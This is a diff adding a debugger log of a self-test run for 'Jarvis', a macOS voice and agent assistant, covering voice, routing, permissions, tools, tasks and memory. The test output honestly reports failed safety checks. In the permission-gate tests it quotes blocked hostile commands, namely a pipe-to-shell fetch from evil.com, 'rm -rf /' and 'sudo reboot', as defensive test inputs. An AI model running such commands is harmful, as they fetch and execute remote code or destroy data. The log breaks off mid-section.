@@ -1,0 +1,591 @@
+(lldb) target create "/Users/jayanthpranaykonada/Zia/.build/out/Products/Debug/Jarvis"
+Current executable set to '/Users/jayanthpranaykonada/Zia/.build/out/Products/Debug/Jarvis' (arm64).
+(lldb) settings set -- target.run-args  "--self-test"
+(lldb) run
+╔══════════════════════════════════════════╗
+║      JARVIS — Self-Test Suite           ║
+╚══════════════════════════════════════════╝
+
+
+─── AppState ───
+  ✓ Initial state is OFF
+2026-09-26 12:55:54.430927+0530 Jarvis[32358:4571888] [app] State: off → sleep
+2026-09-26 12:55:54.431205+0530 Jarvis[32358:4571888] [events] ⚡ StateChangedEvent
+  ✓ OFF → SLEEP works
+2026-09-26 12:55:54.431220+0530 Jarvis[32358:4571888] [app] State: sleep → active
+2026-09-26 12:55:54.431227+0530 Jarvis[32358:4571888] [events] ⚡ StateChangedEvent
+  ✓ SLEEP → ACTIVE works
+2026-09-26 12:55:54.431234+0530 Jarvis[32358:4571888] [app] State: active → sleep
+2026-09-26 12:55:54.431239+0530 Jarvis[32358:4571888] [events] ⚡ StateChangedEvent
+  ✓ ACTIVE → SLEEP works
+2026-09-26 12:55:54.431246+0530 Jarvis[32358:4571888] [app] State: sleep → off
+2026-09-26 12:55:54.431250+0530 Jarvis[32358:4571888] [events] ⚡ StateChangedEvent
+  ✓ SLEEP → OFF works
+2026-09-26 12:55:54.431256+0530 Jarvis[32358:4571888] [app] Invalid transition: off → active
+  ✓ OFF → ACTIVE rejected (invalid)
+  ✓ Same-state is no-op
+  ✓ Network offline update
+  ✓ Network online update
+  ✓ Memory pressure warning
+  ✓ Memory pressure nominal
+
+─── EventBus ───
+2026-09-26 12:55:54.431337+0530 Jarvis[32358:4571888] [events] ⚡ TestEvent
+  ✓ Publish delivers to subscriber
+2026-09-26 12:55:54.431532+0530 Jarvis[32358:4571888] [events] ⚡ TestEvent
+  ✓ Multiple subscribers all receive
+2026-09-26 12:55:54.431551+0530 Jarvis[32358:4571888] [events] ⚡ TestEvent
+  ✓ Event types are isolated
+2026-09-26 12:55:54.431560+0530 Jarvis[32358:4571888] [events] ⚡ TestEvent
+2026-09-26 12:55:54.431597+0530 Jarvis[32358:4571888] [events] ⚡ TestEvent
+  ✓ Unsubscribe stops delivery
+2026-09-26 12:55:54.431606+0530 Jarvis[32358:4571888] [events] ⚡ TestEvent
+  ✓ removeAll clears all handlers
+2026-09-26 12:55:54.431612+0530 Jarvis[32358:4571888] [events] ⚡ TestEvent
+  ✓ No subscribers does not crash
+
+─── PipelineTimer ───
+  ✓ Report has correct ID
+  ✓ Report has 3 stages
+  ✓ Total time greater than 0
+  ✓ Elapsed between stages greater than 0
+  ✓ Missing stage returns nil
+  ✓ Empty timer has no stages
+  ✓ Summary contains ID
+
+─── Config ───
+  ✓ Wake word has default
+  ✓ Autonomy level in range
+  ✓ Budget has default
+  ✓ Memory reserve has default
+
+─── ResourceManager ───
+  ✓ Total memory detected: 16384MB
+2026-09-26 12:55:54.438427+0530 Jarvis[32358:4571888] [resources] Model loaded: test-model (~100MB)
+  ✓ Model registered
+  ✓ Model memory tracked
+2026-09-26 12:55:54.438453+0530 Jarvis[32358:4571888] [resources] Model unloaded: test-model
+  ✓ Model unregistered
+  ✓ Model memory freed
+
+─── Phase 2: Audio Permissions & Capture ───
+  ✓ Microphone authorization status returns valid enum state (Authorized)
+  ✓ AudioCapture buffer injection delivers PCM frames to registered tap handlers
+
+─── Phase 2: Voice Activity Detector ───
+  ✓ VAD default threshold is positive
+  ✓ VAD hangover frames > 0
+  ✓ VAD reset clears speaking state
+
+─── Phase 2: Wake Word Detector ───
+2026-09-26 12:55:54.453795+0530 Jarvis[32358:4571888] [voice] Wake word detector listening for: 'jarvis'
+  ✓ Wake word detector is active
+2026-09-26 12:55:54.453829+0530 Jarvis[32358:4571888] [voice] Wake word 'jarvis' detected in transcript: 'Jarvis, what is the weather?'
+2026-09-26 12:55:54.453837+0530 Jarvis[32358:4571888] [events] ⚡ WakeWordDetectedEvent
+  ✓ Detects 'Jarvis' at sentence start
+  ✓ Emits WakeWordDetectedEvent
+  ✓ Ignores sentences without wake word
+2026-09-26 12:55:54.454179+0530 Jarvis[32358:4571888] [voice] Wake word 'jarvis' detected in transcript: 'Hey Jarvis tell me a joke'
+2026-09-26 12:55:54.454185+0530 Jarvis[32358:4571888] [events] ⚡ WakeWordDetectedEvent
+  ✓ Detects 'Jarvis' in compound sentence
+2026-09-26 12:55:54.454239+0530 Jarvis[32358:4571888] [voice] Wake word detector stopped
+  ✓ Wake word detector stopped
+
+─── Phase 2: Apple Speech Recognition ───
+  ✓ Speech recognition authorization status returns valid enum state (Authorized)
+2026-09-26 12:55:54.461307+0530 Jarvis[32358:4571888] [voice] Simulated partial transcript: 'open safari'
+2026-09-26 12:55:54.461317+0530 Jarvis[32358:4571888] [events] ⚡ TranscriptPartialEvent
+2026-09-26 12:55:54.461361+0530 Jarvis[32358:4571888] [security] EmergencyInterrupt production subscribers registered: 6
+  ✓ Partial transcript delivered via TranscriptPartialEvent
+2026-09-26 12:55:54.461614+0530 Jarvis[32358:4571888] [voice] Simulated final transcript (12.500000ms): 'open safari'
+2026-09-26 12:55:54.461622+0530 Jarvis[32358:4571888] [events] ⚡ TranscriptFinalEvent
+  ✓ Final transcript delivered via TranscriptFinalEvent with duration metric
+
+─── Phase 2: Emergency Interrupt & Cancellation ───
+  ✓ Emergency stop production subscribers registered (>= 6)
+2026-09-26 12:55:54.461666+0530 Jarvis[32358:4571888] [security] EMERGENCY STOP TRIGGERED: 'stop'
+2026-09-26 12:55:55.116387+0530 Jarvis[32358:4571888] [voice] Speech recognition cancelled
+2026-09-26 12:55:55.116411+0530 Jarvis[32358:4571888] [events] ⚡ EmergencyStopEvent
+2026-09-26 12:55:55.116424+0530 Jarvis[32358:4571888] [voice] Speech recognition cancelled
+2026-09-26 12:55:55.116494+0530 Jarvis[32358:4571888] [security] Emergency stop halt completed in 654.83ms
+2026-09-26 12:55:55.145816+0530 Jarvis[32358:4571888] [voice] Speaking: 'Stopped.'
+  ✓ Detects standalone 'stop'
+  ✓ Emits EmergencyStopEvent
+  ✗ FAIL: Emergency stop halt latency is sub-50ms (654.83ms)
+2026-09-26 12:55:55.145998+0530 Jarvis[32358:4571888] [security] EMERGENCY STOP TRIGGERED: 'cancel'
+2026-09-26 12:55:55.146013+0530 Jarvis[32358:4571888] [voice] Speech recognition cancelled
+2026-09-26 12:55:55.146023+0530 Jarvis[32358:4571888] [events] ⚡ EmergencyStopEvent
+2026-09-26 12:55:55.146033+0530 Jarvis[32358:4571888] [voice] Speech recognition cancelled
+2026-09-26 12:55:55.146046+0530 Jarvis[32358:4571888] [security] Emergency stop halt completed in 0.06ms
+2026-09-26 12:55:55.146115+0530 Jarvis[32358:4571888] [voice] Speaking: 'Stopped.'
+  ✓ Case-insensitive emergency detection
+2026-09-26 12:55:55.146147+0530 Jarvis[32358:4571888] [security] EMERGENCY STOP TRIGGERED: 'abort'
+2026-09-26 12:55:55.146155+0530 Jarvis[32358:4571888] [voice] Speech recognition cancelled
+2026-09-26 12:55:55.146160+0530 Jarvis[32358:4571888] [events] ⚡ EmergencyStopEvent
+2026-09-26 12:55:55.146164+0530 Jarvis[32358:4571888] [voice] Speech recognition cancelled
+2026-09-26 12:55:55.146174+0530 Jarvis[32358:4571888] [security] Emergency stop halt completed in 0.03ms
+2026-09-26 12:55:55.146229+0530 Jarvis[32358:4571888] [voice] Speaking: 'Stopped.'
+  ✓ Punctuation-tolerant emergency detection
+2026-09-26 12:55:55.146268+0530 Jarvis[32358:4571888] [security] EMERGENCY STOP TRIGGERED: 'jarvis stop'
+2026-09-26 12:55:55.146279+0530 Jarvis[32358:4571888] [voice] Speech recognition cancelled
+2026-09-26 12:55:55.146286+0530 Jarvis[32358:4571888] [events] ⚡ EmergencyStopEvent
+2026-09-26 12:55:55.146293+0530 Jarvis[32358:4571888] [voice] Speech recognition cancelled
+2026-09-26 12:55:55.146305+0530 Jarvis[32358:4571888] [security] Emergency stop halt completed in 0.04ms
+2026-09-26 12:55:55.146344+0530 Jarvis[32358:4571888] [voice] Speaking: 'Stopped.'
+  ✓ Prefix emergency detection ('jarvis stop')
+  ✓ Does not false-positive on casual usage ('don't stop')
+
+─── Phase 2: TTS Engine & Barge-In ───
+  ✓ TTS is idle initially
+  ✓ TTS stop when idle does not crash
+2026-09-26 12:55:55.146411+0530 Jarvis[32358:4571888] [voice] Speaking: 'Testing barge in audio output'
+2026-09-26 12:55:55.146420+0530 Jarvis[32358:4571888] [events] ⚡ UserInterruptedEvent
+2026-09-26 12:55:55.146427+0530 Jarvis[32358:4571888] [voice] Barge-in executed: halted playback and speech
+  ✓ UserInterruptedEvent halts TTS immediately (barge-in)
+
+─── Phase 2: Audio Player ───
+  ✓ AudioPlayer is idle initially
+  ✓ AudioPlayer stop when idle does not crash
+
+─── Phase 2: Voice Pipeline & Decoupling ───
+  ✓ VoicePipeline initially not running before start
+2026-09-26 12:55:55.146979+0530 Jarvis[32358:4571888] [voice] VoicePipeline handling transition to state: off
+2026-09-26 12:55:55.146987+0530 Jarvis[32358:4571888] [voice] VoicePipeline initialized and active
+2026-09-26 12:55:55.147626+0530 Jarvis[32358:4571888] [SpeechFramework] +[SFUtilities defaultClientID]_block_invoke Application does not have a bundle identifier; using unstable "Jarvis" as client identifier
+2026-09-26 12:55:55.262351+0530 Jarvis[32358:4571888] [voice] [VOICE_TRACE] startup: bundled=false micAuth=Authorized sttAuth=Authorized onDeviceSupport=true recognizerAvailable=true
+  ✓ VoicePipeline starts cleanly
+  ✓ VoicePipeline status reflects active runtime
+  ✓ VoicePipeline reports microphone authorization truthfully
+  ✓ VoicePipeline reports speech authorization truthfully
+2026-09-26 12:55:55.262432+0530 Jarvis[32358:4571888] [voice] Simulated final transcript (10.000000ms): 'what time is it'
+2026-09-26 12:55:55.262453+0530 Jarvis[32358:4571888] [events] ⚡ TranscriptFinalEvent
+2026-09-26 12:55:55.262478+0530 Jarvis[32358:4571888] [voice] Processing command: 'what time is it'
+2026-09-26 12:55:55.262629+0530 Jarvis[32358:4571888] [voice] Voice command matched deterministic intent: system.time
+  ✓ Voice interaction loop remains responsive after command handoff
+2026-09-26 12:55:55.262658+0530 Jarvis[32358:4571888] [security] EMERGENCY STOP TRIGGERED: 'STOP'
+2026-09-26 12:55:55.262690+0530 Jarvis[32358:4571888] [voice] TTS stopped immediately in 0.01ms
+2026-09-26 12:55:55.262696+0530 Jarvis[32358:4571888] [voice] Speech recognition cancelled
+2026-09-26 12:55:55.262702+0530 Jarvis[32358:4571888] [events] ⚡ EmergencyStopEvent
+2026-09-26 12:55:55.262710+0530 Jarvis[32358:4571888] [voice] Speech recognition cancelled
+2026-09-26 12:55:55.262720+0530 Jarvis[32358:4571888] [security] Emergency stop handled in pipeline: 'STOP'
+2026-09-26 12:55:55.262743+0530 Jarvis[32358:4571888] [security] Emergency stop halt completed in 0.09ms
+2026-09-26 12:55:55.262828+0530 Jarvis[32358:4571888] [voice] Speaking: 'Stopped.'
+  ✓ Emergency stop cleans up all in-flight voice background tasks
+2026-09-26 12:55:55.262846+0530 Jarvis[32358:4571888] [voice] VoicePipeline stopped
+
+─── Phase 3: Deterministic Router ───
+  ✓ Matches 'open Safari'
+  ✓ Intent is app.open
+  ✓ Extracts app name 'safari'
+  ✓ Matches quit command
+  ✓ Matches volume set command
+  ✓ Extracts volume level 65
+  ✓ Matches mute command
+  ✓ Matches volume up
+  ✓ Matches time query
+  ✓ Matches date query
+  ✓ Matches lock screen
+  ✓ Matches empty trash
+  ✓ Empty trash is classified destructive
+  ✗ FAIL: PermissionGate blocks destructive empty trash at default L1
+  ✓ Matches 'switch to Safari'
+  ✓ Matches 'open Downloads'
+  ✓ Matches 'show my Desktop'
+  ✓ Matches battery query
+  ✓ Matches Wi-Fi query
+  ✓ Battery status query returns real data: Your battery is at 87% on battery power.
+  ✓ Wi-Fi status query returns real data: Connected to the internet via unknown, not Wi-Fi.
+  ✓ Matches read clipboard
+  ✓ Matches 'copy this:'
+  ✓ Matches system status
+  ✓ Complex queries yield nil (forwarded to LLM)
+  ✓ Rejects 'delete everything'
+  ✓ Rejects 'shut down'
+  ✓ Rejects 'run rm -rf /'
+
+─── Planner Reliability: DirectAnswerRouter ───
+  ✓ Unsafe request → explicit unsafeRequest refusal
+  ✓ Unsupported capability → explicit unsupportedCapability refusal
+  ✓ Empty/malformed request → explicit malformedRequest refusal
+  ✓ Knowledge question → direct answer
+  ✓ Explanation request → direct answer
+  ✓ Time question classified direct-answer (deterministic router still runs first in AgentLoop)
+  ✓ Web task → planner
+  ✓ Shell task → planner
+  ✓ Question containing action verb stays ambiguous → planner (no over-refusal)
+
+─── Planner Reliability: named-tool hint grounding ───
+  ✓ Goal-named tools are force-included in planner catalog
+  ✓ Shell hint still fires for echo goals
+
+─── Phase 3: Clipboard Manager ───
+2026-09-26 12:55:55.304479+0530 Jarvis[32358:4571888] [actions] Copied text to clipboard (22 chars)
+  ✓ Clipboard write and read back
+2026-09-26 12:55:55.325846+0530 Jarvis[32358:4571888] [actions] Cleared system clipboard
+  ✓ Clipboard cleared
+
+─── Phase 3: File Manager & Security Sandbox ───
+  ✓ Path resolution expands tilde
+2026-09-26 12:55:55.325980+0530 Jarvis[32358:4571888] [security] Blocked unsafe file operation writeFile on /System/malicious.txt
+  ✓ Security sandbox blocks writing to /System
+  ✓ Lists home directory successfully
+
+─── Phase 3: System Control ───
+2026-09-26 12:55:55.510982+0530 Jarvis[32358:4571888] [plugin] AddInstanceForFactory: No factory registered for id <CFUUID 0x749f401ce0> F8BB1C28-BAE8-11D6-9C31-00039315CD46
+2026-09-26 12:55:55.551381+0530 Jarvis[32358:4571909] [actions] Browser automation cancelled: 0 pending action(s) dropped
+2026-09-26 12:55:55.551714+0530 Jarvis[32358:4571909] [security] EMERGENCY STOP: Cancelling all background workers and queued tasks
+2026-09-26 12:55:55.552887+0530 Jarvis[32358:4571916] [security] AgentLoop.emergencyCancel: in-flight agent run cancellation requested
+2026-09-26 12:55:55.552890+0530 Jarvis[32358:4571909] [security] EMERGENCY STOP: Cancelling all background workers and queued tasks
+2026-09-26 12:55:55.552905+0530 Jarvis[32358:4571916] [security] AgentLoop.emergencyCancel: in-flight agent run cancellation requested
+2026-09-26 12:55:55.552914+0530 Jarvis[32358:4571909] [actions] Browser automation cancelled: 0 pending action(s) dropped
+2026-09-26 12:55:55.552915+0530 Jarvis[32358:4571916] [security] AgentLoop.emergencyCancel: in-flight agent run cancellation requested
+2026-09-26 12:55:55.552922+0530 Jarvis[32358:4571909] [actions] Browser automation cancelled: 0 pending action(s) dropped
+2026-09-26 12:55:55.552926+0530 Jarvis[32358:4571909] [actions] Browser automation cancelled: 0 pending action(s) dropped
+2026-09-26 12:55:55.552927+0530 Jarvis[32358:4571916] [security] AgentLoop.emergencyCancel: in-flight agent run cancellation requested
+2026-09-26 12:55:55.552936+0530 Jarvis[32358:4571909] [security] EMERGENCY STOP: Cancelling all background workers and queued tasks
+2026-09-26 12:55:55.552970+0530 Jarvis[32358:4571909] [security] EMERGENCY STOP: Cancelling all background workers and queued tasks
+2026-09-26 12:55:55.553652+0530 Jarvis[32358:4571888] [actions] ActionEngine executing intent: 'system.time' (impact: readOnly)
+2026-09-26 12:55:55.553674+0530 Jarvis[32358:4571888] [events] ⚡ IntentDetectedEvent
+2026-09-26 12:55:55.553694+0530 Jarvis[32358:4571916] [actions] Browser automation cancelled: 0 pending action(s) dropped
+2026-09-26 12:55:55.553707+0530 Jarvis[32358:4571916] [security] AgentLoop.emergencyCancel: in-flight agent run cancellation requested
+2026-09-26 12:55:55.553708+0530 Jarvis[32358:4571914] [security] EMERGENCY STOP: Cancelling all background workers and queued tasks
+2026-09-26 12:55:55.555140+0530 Jarvis[32358:4571888] [voice] TTS audio started (audio-start latency: 292.3ms)
+2026-09-26 12:55:55.555154+0530 Jarvis[32358:4571888] [voice] TTS utterance was cancelled
+2026-09-26 12:55:55.558135+0530 Jarvis[32358:4571888] [actions] ActionEngine completed 'system.time' in 4.5ms: 'The time is 12:55 PM.'
+2026-09-26 12:55:55.558148+0530 Jarvis[32358:4571888] [voice] ActionEngine completed 'system.time' in 4.52ms: 'The time is 12:55 PM.'
+2026-09-26 12:55:55.558189+0530 Jarvis[32358:4571888] [AXCommon] Potential Structural Swift Concurrency Issue: unsafeForcedSync called from Swift Concurrent context.
+2026-09-26 12:55:55.558281+0530 Jarvis[32358:4571888] [voice] Speaking: 'The time is 12:55 PM.'
+2026-09-26 12:55:55.560096+0530 Jarvis[32358:4571888] [voice] TTS audio started (audio-start latency: 1.8ms)
+  ✓ Reads valid system volume: 75%
+
+─── Phase 4: Conversation & Message Model ───
+2026-09-26 12:55:55.573582+0530 Jarvis[32358:4571888] [brain] ConversationManager reset
+2026-09-26 12:55:55.573590+0530 Jarvis[32358:4571888] [brain] ConversationManager reset
+  ✓ Initial conversation has system prompt
+  ✓ First message is system role
+  ✓ User message appended
+  ✓ Last message is user role
+  ✓ Assistant message appended
+  ✓ Last message is assistant role
+  ✓ Trims history to maxHistoryCount + system
+  ✓ Preserves system prompt after trim
+2026-09-26 12:55:55.573676+0530 Jarvis[32358:4571888] [brain] ConversationManager reset
+
+─── Phase 4: Provider & Capabilities ───
+  ✓ MLXProvider has textGeneration capability
+  ✓ MLXProvider has toolCalling capability
+  ✓ MLXProvider reports valid latency
+
+─── Phase 4: Intent Classifier ───
+2026-09-26 12:55:55.574278+0530 Jarvis[32358:4571888] [brain] Intent classified: coding in 0.0ms (provider: claude)
+  ✓ Classifies code request as .coding
+  ✓ Routes coding to Claude
+2026-09-26 12:55:55.574302+0530 Jarvis[32358:4571888] [brain] Intent classified: deepReasoning in 0.0ms (provider: claude)
+  ✓ Classifies deep question as .deepReasoning
+2026-09-26 12:55:55.574323+0530 Jarvis[32358:4571888] [brain] Intent classified: webSearch in 0.0ms (provider: groq)
+  ✓ Classifies web request as .webSearch
+2026-09-26 12:55:55.574343+0530 Jarvis[32358:4571888] [brain] Intent classified: conversation in 0.0ms (provider: local-normal)
+  ✓ Classifies general chat as .conversation
+
+─── Phase 5: Cloud Providers ───
+  ✓ ClaudeProvider has ID 'anthropic'
+  ✓ Claude has codeGeneration capability
+  ✓ GeminiProvider has ID 'gemini'
+  ✓ Gemini has vision capability
+  ✓ OpenAIProvider has ID 'openai'
+  ✓ OpenAI has realtimeVoice capability
+  ✓ GroqProvider has ID 'groq'
+  ✓ Groq has 150ms target latency
+
+─── Phase 5: Fallback Chains ───
+  ✓ Coding fallback chain starts with Claude
+  ✓ Coding chain includes on-device MLX fallback
+  ✓ Deep reasoning chain starts with Claude
+  ✓ Web search chain starts with Groq
+
+─── Phase 5: Context Builder ───
+  ✓ Estimates positive token count (6)
+  ✓ Built context has system prompt at index 0
+  ✓ System prompt injects JARVIS metadata
+
+─── Phase 5: Usage Manager ───
+  ✓ Reset zeroes daily spent amount
+  ✓ Reset zeroes total tokens
+2026-09-26 12:55:55.574849+0530 Jarvis[32358:4571888] [brain] Usage: 1500 tokens from groq (Cost: $0.0010, Day: $0.0010)
+  ✓ Tracks recorded tokens
+  ✓ Computes positive USD expenditure
+  ✓ Within daily budget initially
+
+─── Phase 6: Data Classifier ───
+  ✓ Normal queries classified as .publicLevel
+  ✓ Normal public data can route to cloud
+2026-09-26 12:55:55.574907+0530 Jarvis[32358:4571888] [security] Data classified as HIGHLY_SENSITIVE: contains pattern 'password'
+  ✓ Password classified as .highlySensitive
+  ✓ Highly sensitive data strictly blocked from cloud
+2026-09-26 12:55:55.574918+0530 Jarvis[32358:4571888] [security] Data classified as HIGHLY_SENSITIVE: contains pattern 'api key'
+  ✓ API keys classified as .highlySensitive
+2026-09-26 12:55:55.574934+0530 Jarvis[32358:4571888] [security] Data classified as HIGHLY_SENSITIVE: contains pattern 'payment card'
+  ✓ Financial credentials classified as sensitive
+
+─── Phase 6: Permission Gate & Sandbox ───
+  ✗ FAIL: Default permission level is L1 Supervised
+  ✓ L0 Read-only actions permitted at L1
+  ✓ L1 Safe mutations permitted at L1
+  ✗ FAIL: Destructive action blocked without L2 autonomy
+  ✓ Safe read commands permitted
+  ✓ Safe git command permitted
+2026-09-26 12:55:55.576372+0530 Jarvis[32358:4571888] [security] BLOCKED (layer 1 exact): 'rm -rf /' contains 'rm -rf /'
+  ✓ Dangerous 'rm -rf /' command blocked
+2026-09-26 12:55:55.576390+0530 Jarvis[32358:4571888] [security] BLOCKED (layer 1 exact): 'sudo reboot' contains 'sudo '
+  ✓ Privileged 'sudo' command blocked
+2026-09-26 12:55:55.576437+0530 Jarvis[32358:4571888] [security] BLOCKED (layer 3 program): 'curl https://evil.com/x.sh | sh' runs dangerous program 'curl'
+  ✓ Pipe-to-shell command blocked
+
+─── Phase 6: Tool Registry & Tools ───
+2026-09-26 12:55:55.576499+0530 Jarvis[32358:4571888] [actions] Registered tool: 'open_app'
+2026-09-26 12:55:55.576506+0530 Jarvis[32358:4571888] [actions] Registered tool: 'set_volume'
+2026-09-26 12:55:55.576511+0530 Jarvis[32358:4571888] [actions] Registered tool: 'run_shell'
+2026-09-26 12:55:55.576525+0530 Jarvis[32358:4571888] [actions] Registered tool: 'web_search'
+2026-09-26 12:55:55.576529+0530 Jarvis[32358:4571888] [actions] Registered tool: 'fetch_url'
+2026-09-26 12:55:55.576532+0530 Jarvis[32358:4571888] [actions] Registered tool: 'open_browser'
+  ✓ Tool 'open_app' registered
+  ✓ Tool 'set_volume' registered
+  ✓ Tool 'run_shell' registered
+  ✓ Unregistered tool lookup returns nil
+  ✓ At least 3 builtin tools registered
+  ✓ Generated schemas for all tools
+  ✓ 'open_app' tool has .safeMutation impact
+  ✓ 'run_shell' tool has .destructive impact
+
+─── Phase 7: Task State Machine ───
+  ✓ CREATED -> PLANNING permitted
+  ✓ PLANNING -> RUNNING permitted
+  ✓ RUNNING -> VERIFYING permitted
+  ✓ VERIFYING -> COMPLETED permitted
+  ✓ CREATED -> COMPLETED rejected
+  ✓ RUNNING -> FAILED permitted on error
+  ✓ FAILED -> RECOVERING permitted
+  ✓ RECOVERING -> REPLANNING permitted
+  ✓ REPLANNING -> RUNNING permitted
+  ✓ Active RUNNING can be CANCELLED
+  ✓ Active PLANNING can be CANCELLED
+  ✓ COMPLETED is terminal state
+  ✓ CANCELLED is terminal state
+  ✓ Terminal COMPLETED cannot transition
+
+─── Phase 7: Task Lifecycle & Progress ───
+2026-09-26 12:55:55.576628+0530 Jarvis[32358:4571888] [actions] Created task [E7C84092]: 'Test Backup Goal'
+  ✓ Newly created task has CREATED state
+  ✓ Task registered and retrievable by ID
+  ✓ Active tasks includes newly created task
+2026-09-26 12:55:55.576743+0530 Jarvis[32358:4571888] [actions] Task [E7C84092] transitioned: CREATED -> PLANNING
+  ✓ Transition to PLANNING successful
+  ✓ Task steps assigned successfully
+2026-09-26 12:55:55.576763+0530 Jarvis[32358:4571888] [actions] Task [E7C84092] transitioned: PLANNING -> RUNNING
+  ✓ Transition to RUNNING successful
+  ✓ Step 1 marked completed
+  ✓ Task progress accurately calculated as 50%
+2026-09-26 12:55:55.576787+0530 Jarvis[32358:4571888] [actions] Task [E7C84092] transitioned: RUNNING -> VERIFYING
+  ✓ Transition to VERIFYING successful
+2026-09-26 12:55:55.576796+0530 Jarvis[32358:4571888] [actions] Task [E7C84092] transitioned: VERIFYING -> COMPLETED
+  ✓ Transition to COMPLETED successful
+  ✓ Completed timestamp recorded
+  ✓ Completed task removed from active tasks list
+  ✓ Task audit history records all state transitions (5 states)
+2026-09-26 12:55:55.576810+0530 Jarvis[32358:4571888] [actions] Invalid state transition for [E7C84092]: COMPLETED -> RUNNING
+  ✓ Invalid transition from terminal COMPLETED throws error
+
+─── Phase 7: Task Worker & Pool ───
+  ✓ Worker pool capacity configured for Apple Silicon M4
+2026-09-26 12:55:55.576829+0530 Jarvis[32358:4571888] [actions] Created task [D948E4E7]: 'Cancelled Task'
+2026-09-26 12:55:55.576835+0530 Jarvis[32358:4571888] [actions] Task [D948E4E7] transitioned: CREATED -> RUNNING
+2026-09-26 12:55:55.576841+0530 Jarvis[32358:4571888] [actions] Task [D948E4E7] transitioned: RUNNING -> CANCELLED
+  ✓ Task safely cancelled
+  ✓ Cancelled task removed from active tasks
+
+─── Phase 8: Accessibility Bridge ───
+  ✓ Accessibility trust check executes without error
+  ✓ AXElementInfo stores element role
+  ✓ AXElementInfo stores element title
+  ✓ AXElementInfo stores element actions
+
+─── Phase 8: Fast UI Mode ───
+  ✓ ActionableUIElement stores label
+  ✓ ActionableUIElement stores role
+2026-09-26 12:55:55.580060+0530 Jarvis[32358:4571888] [actions] Accessibility permission not granted; cannot inspect UI tree
+  ✓ Fast UI Mode describes UI or gracefully returns nil if untrusted
+
+─── Phase 8: Screen Capture & Deep Visual Mode ───
+  ✓ ScreenCaptureKit singleton instantiated
+  ✓ DeepVisualMode subsystem instantiated
+
+─── Phase 9: User Profile ───
+2026-09-26 12:55:55.580126+0530 Jarvis[32358:4571888] [memory] Cleared all user profile memories
+2026-09-26 12:55:55.580139+0530 Jarvis[32358:4571888] [memory] Remembered [EXPLICIT]: 'User prefers dark mode in all editors'
+  ✓ Explicit user fact remembered
+  ✓ Profile stores 1 fact
+  ✓ Profile summary includes remembered fact
+2026-09-26 12:55:55.580177+0530 Jarvis[32358:4571888] [memory] Remembered [TEMPORARY]: 'Temporary project directory is ~/Zia'
+  ✓ Temporary session memory stored
+  ✓ Profile stores 2 facts
+2026-09-26 12:55:55.580191+0530 Jarvis[32358:4571888] [memory] Purged temporary session memories
+  ✓ purgeTemporaryFacts cleans session memories
+  ✓ Explicit memories preserved across purge
+2026-09-26 12:55:55.580210+0530 Jarvis[32358:4571888] [memory] Forgot 1 facts matching 'dark mode'
+  ✓ Forgot 1 fact matching query
+  ✓ Profile cleared after forgetting
+
+─── Phase 9: Conversation Store (SQLite) ───
+2026-09-26 12:55:55.580847+0530 Jarvis[32358:4571888] [memory] Opened SQLite database at /Users/jayanthpranaykonada/Library/Application Support/Jarvis/conversations.sqlite
+2026-09-26 12:55:55.581125+0530 Jarvis[32358:4571888] [memory] Cleared conversation history for 'test_conv'
+  ✓ Loaded 1 persisted message from SQLite
+  ✓ Persisted message content verified
+2026-09-26 12:55:55.582262+0530 Jarvis[32358:4571888] [memory] Cleared conversation history for 'test_conv'
+  ✓ Cleared SQLite test conversation
+
+─── Phase 9: Embedding Engine & Vector Search ───
+  ✓ Generated 64-dimensional embedding vector
+  ✓ Accelerate vDSP unit normalization verified (norm ≈ 1.0)
+  ✓ Identical text produces identical embedding vector
+  ✓ Vector search returned top match
+  ✓ Semantic vector search retrieved hardware match
+  ✓ Cosine similarity score exceeds 0.4 (0.88)
+
+─── Phase 9: Memory Manager Orchestrator ───
+2026-09-26 12:55:55.583408+0530 Jarvis[32358:4571888] [memory] Purged temporary session memories
+2026-09-26 12:55:55.583411+0530 Jarvis[32358:4571888] [memory] Cleared all user profile memories
+2026-09-26 12:55:55.583434+0530 Jarvis[32358:4571888] [memory] Cleared conversation history for 'default'
+2026-09-26 12:55:55.583441+0530 Jarvis[32358:4571888] [memory] Reset all memory subsystems
+2026-09-26 12:55:55.583446+0530 Jarvis[32358:4571888] [memory] Remembered [EXPLICIT]: 'User's favorite programming language is Swift'
+  ✓ MemoryManager stores and formats memories
+  ✓ MemoryManager semantic retrieval injects relevant context
+2026-09-26 12:55:55.583483+0530 Jarvis[32358:4571888] [memory] Cleared all user profile memories
+2026-09-26 12:55:55.583501+0530 Jarvis[32358:4571888] [memory] Cleared conversation history for 'default'
+2026-09-26 12:55:55.583505+0530 Jarvis[32358:4571888] [memory] Reset all memory subsystems
+
+─── Phase 10: Source Manager ───
+  ✓ SourceManager deduplicates URLs with trailing slash difference
+  ✓ Duplicate source returns existing Source record
+  ✓ SourceManager stores 2 distinct sources
+  ✓ Citations format contains [1]
+  ✓ Citations format contains [2]
+  ✓ SourceManager cleared successfully
+
+─── Phase 10: Web Search & URL Fetcher ───
+  ✓ WebSearch singleton instantiated
+  ✓ SearchResult stores title
+  ✓ SearchResult stores URL
+  ✓ SearchResult stores snippet
+  ✓ URLFetcher singleton instantiated
+
+─── Phase 10: Browser Automation Subsystem ───
+  ✓ BrowserManager singleton instantiated
+  ✓ BrowserManager supports at least 5 browser types (Default, Safari, Chrome, Arc, Brave)
+  ✓ BrowserTabInfo stores title
+  ✓ BrowserTabInfo stores browser type
+
+─── Phase 10: Web Tools & Function Calling Schemas ───
+  ✓ Tool 'web_search' registered in ToolRegistry
+  ✓ 'web_search' has .readOnly impact
+  ✓ Tool 'fetch_url' registered in ToolRegistry
+  ✓ 'fetch_url' has .readOnly impact
+  ✓ Tool 'open_browser' registered in ToolRegistry
+  ✓ 'open_browser' has .safeMutation impact
+  ✓ ToolRegistry contains at least 6 registered tools (6)
+
+─── Phase 11: Offline Mode & Graceful Degradation ───
+  ✓ Deterministic routing operates fully offline with 0 network calls
+2026-09-26 12:55:55.602154+0530 Jarvis[32358:4571888] [security] Data classified as HIGHLY_SENSITIVE: contains pattern 'secret'
+  ✓ DataClassifier blocks sensitive data offline
+  ✓ Sensitive data blocked from cloud routing under offline policy
+  ✓ Conversation store functions completely offline via local SQLite
+2026-09-26 12:55:55.603036+0530 Jarvis[32358:4571888] [memory] Cleared conversation history for 'offline_test'
+
+─── Phase 11: Memory Pressure & Eviction Simulation ───
+2026-09-26 12:55:55.603051+0530 Jarvis[32358:4571888] [resources] Model loaded: test-reflex-model (~2048MB)
+  ✓ Model registered with ResourceManager
+2026-09-26 12:55:55.603061+0530 Jarvis[32358:4571888] [resources] Memory pressure: nominal → critical (available: 0MB)
